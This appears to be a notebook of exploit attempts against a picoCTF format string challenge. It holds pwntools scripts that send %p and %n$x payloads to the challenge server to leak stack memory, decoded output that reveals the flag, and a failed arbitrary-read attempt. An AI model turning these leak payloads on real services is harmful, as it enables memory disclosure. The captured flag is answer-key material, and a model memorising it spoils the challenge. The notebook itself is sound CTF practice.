# %%
from pwnlib.tubes.remote import remote
from pwn import p32
import re
r = remote("mimas.picoctf.net", 60359)
r.recvuntil(b"Give me your order and I'll read it back to you:")
r.sendline(b"%p"*256)
r.recvuntil(b"Here's your order: ")
out = r.recvline()
print(out)
for b in re.findall("0x[0-9a-f]*", out.decode()):
    if (len(b[2:])%2!=0):
        b = b+"0"
    print(bytes.fromhex(b[2:])[::-1])
# Out:
# [x] Opening connection to mimas.picoctf.net on port 60359
# [x] Opening connection to mimas.picoctf.net on port 60359: Trying 52.15.88.75
# [+] Opening connection to mimas.picoctf.net on port 60359: Done
# ...

# %%
picoCTF{4n1m41_57y13_4x4_f14g_9135fd4e}

# %%
bytes.fromhex("7d653464663533")[::-1]
# Out:
# b'35fd4e}'

# %%
7b4654436f636970
355f31346d316e34
3478345f33317937
31395f673431665f
7d653464663533
7
77bdff2a18d8
2300000007
206e693374307250
a336c797453
9
77bdff2b2de9
77bdff083098
77bdff29f4d0

# %%
picoCT 4n1m41 7y13_4 _f14g_

# %%
re.findall("0x[0-9a-f]*", out.decode())
# Out:
# ['0x402118',
#  '0x7bd15864ba00',
#  '0x1b388800',
#  '0x7ffc9050c3800',
#  '0x7bd1586614d00',
#  '0x7ffc9050c450',
#  '0x7b4654436f6369700',
#  '0x3478345f333179370',
#  '0x7d6534646635330',
#  '0x7bd1586638d80',
#  '0x206e6933743072500',
#  '0x90',
#  '0x7bd1584450980',
#  '0x7ffc9050c4600',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
#  '0x70257025702570250',
# ...

# %%
out
# Out:
# b'0x402118(nil)0x7f5d84951a00(nil)0x7078800xa3478340x7ffc70e12f600x7f5d84742e600x7f5d849674d00x10x7ffc70e13030(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x31395f673431665f0x7d6534646635330x70x7f5d849698d80x23000000070x206e6933743072500xa336c7974530x90x7f5d8497ade90x7f5d8474b0980x7f5d849674d0(nil)...(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x7056800x10x7f5d84764d90(nil)0x4011f60x1000000000x7ffc70e134b8(nil)0x468cad85b7753a20x7ffc70e134b80x4011f60x403e180x7f5d849a30400xfb902b1a3c1553a20xfad3c234c1fd53a20x7f5d00000000(nil)(nil)(nil)(nil)0xe8e970ae9c14f00(nil)0x7f5d84764e400x7ffc70e134c80x403e180x7f5d849a42e0(nil)(nil)0x4011100x7ffc70e134b0(nil)(nil)0x4011350x7ffc70e134a80x1c0x10x7ffc70e1
# ...

# %%
from pwnlib.tubes.remote import remote
from pwn import p32
r = remote("mimas.picoctf.net", 60900)
r.recvuntil(b"Give me your order and I'll read it back to you:")
r.sendline(b"%30$s"+b"x"*30+p32(0x00401000))
r.recvline()
r.recvline()
# print(r.recvuntil(b"Here's your order: "))
# a = r.recvline()
# print(a)
# print([bytes.fromhex(i) for i in a.decode()[:-1].split(" ")])
# print(r.recvuntil(b"Bye!"))
# r.recvall()
# Out:
# [x] Opening connection to mimas.picoctf.net on port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900: Trying 52.15.88.75
# [+] Opening connection to mimas.picoctf.net on port 60900: Done
# ---------------------------------------------------------------------------
# EOFError                                  Traceback (most recent call last)
# Cell In[13], line 7
#       5 r.sendline(b"%30$s"+b"x"*30+p32(0x00401000))
#       6 r.recvline()
# ----> 7 r.recvline()
#       8 # print(r.recvuntil(b"Here's your order: "))
#       9 # a = r.recvline()
#      10 # print(a)
#      11 # print([bytes.fromhex(i) for i in a.decode()[:-1].split(" ")])
#      12 # print(r.recvuntil(b"Bye!"))
#      13 # r.recvall()
#
# File c:\Users\picokatx\Documents\CTF\.venv\Lib\site-packages\pwnlib\tubes\tube.py:497, in tube.recvline(self, keepends, timeout)
#     463 def recvline(self, keepends=True, timeout=default):
#     464     r"""recvline(keepends=True, timeout=default) -> bytes
# ...

# %%
from pwn import *
for i in range(31):
    payload = f"AAAA%{i}$x".encode()
    r = remote("mimas.picoctf.net", 60900)
    r.recvuntil(b"Give me your order and I'll read it back to you:")
    r.sendline(payload)
    r.recvuntil(b"Here's your order: ")
    output = r.clean()
    print(output)
    if b"41414141" in output:
        log.success(f"User input is at offset : {i}")
        break
    r.close()
# Out:
# [x] Opening connection to mimas.picoctf.net on port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900: Trying 52.15.88.75
# [+] Opening connection to mimas.picoctf.net on port 60900: Done
# b'AAAA%0$x\nBye!\n'
# [*] Closed connection to mimas.picoctf.net port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900: Trying 52.15.88.75
# [+] Opening connection to mimas.picoctf.net on port 60900: Done
# b'AAAA402118\nBye!\n'
# [*] Closed connection to mimas.picoctf.net port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900: Trying 52.15.88.75
# [+] Opening connection to mimas.picoctf.net on port 60900: Done
# b'AAAA0\nBye!\n'
# [*] Closed connection to mimas.picoctf.net port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900
# [x] Opening connection to mimas.picoctf.net on port 60900: Trying 52.15.88.75
# ...
